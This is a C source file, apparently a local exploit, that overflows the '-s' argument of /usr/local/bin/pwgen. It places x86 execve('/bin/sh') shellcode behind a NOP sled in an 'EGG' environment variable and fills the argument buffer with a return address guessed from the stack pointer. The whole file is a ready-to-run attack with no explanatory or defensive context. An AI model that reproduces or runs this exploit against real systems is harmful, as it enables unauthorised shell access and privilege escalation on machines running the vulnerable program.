#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define NOP 0x90

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(){
	__asm__("movl %esp, %eax");
}

int main(int argc, char* argv[]){
	char *buff, *ptr, *egg;
	long *addr_ptr, addr;
	int offset = 0, bsize = 1248;
	int i, eggsize = 2048;
	char *newargv[] = {"/usr/local/bin/pwgen", "-s $RET", NULL};
	char *newenv[] = { NULL, NULL, NULL};
	char exename[] = "/usr/local/bin/pwgen";

	if(argc >1) bsize = atoi(argv[1]);
	if(argc >2) offset = atoi(argv[2]);
	if(argc >3)eggsize = atoi(argv[3]);

	if(!(buff = malloc(bsize)))
	{
		printf("Can't malloc.\n");
		exit(0);
	}
	if(!(egg=malloc(eggsize))){
		printf("Can't malloc.\n");
		exit(0);
	}

	//Calbulate the address the egg shell may be
	addr = get_sp() - offset;

	//Fill the buff with the egg address
	ptr = buff;
	addr_ptr = (long*)ptr;
	for(i=0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
	
	//Fill the egg with NOP instructions.
	ptr = egg;
	for(i=0; i < eggsize - strlen(shellcode) - 1;i++)
		*(ptr++) = NOP;

	//Fill the last part of eggshell with shellcode.
	for(i=0; i < strlen(shellcode);i++)
		*(ptr++) = shellcode[i];

	buff[bsize-1] = '\0';
	egg[eggsize-1] = '\0';
	
	memcpy(egg, "EGG=", 4);
	memcpy(buff, "-s  ",4);

	newenv[0] = egg;
	putenv(egg);
	putenv(buff);
	newargv[1] = buff;

	execve(exename, newargv, newenv);
	perror("execve");
	exit(0);
}

